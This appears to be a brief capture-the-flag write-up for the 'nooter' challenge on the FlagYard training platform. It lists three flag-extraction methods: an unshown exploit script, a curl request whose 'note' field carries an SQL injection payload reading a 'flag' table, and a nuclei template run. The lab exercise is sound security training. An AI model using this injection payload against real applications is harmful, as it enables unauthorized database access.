# FlagYard
Flagyard is an online platform that offers hands-on cybersecurity training, including various types of capture-the-flag

#nooter
https://flagyard.com/labs/training-labs/2/challenges/00c862b7-13cb-4142-8116-3dde550f4daa

Method 1: 

Step 1: Run python exploit.py

Step 2: Enter URL and Your session cookie
![2](https://github.com/user-attachments/assets/77f7c400-81c2-47f0-bce1-7187a538ce8e)


Method 2:

#curl -X POST http://example.com -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: session=YOUR_SESSION_COOKIE" --data "note=AppSec' || (select * from flag)) --"

Method 3:

#nuclei -t flag-extraction.yaml -u http://example.com -var cookie="YOUR_SESSION_COOKIE"
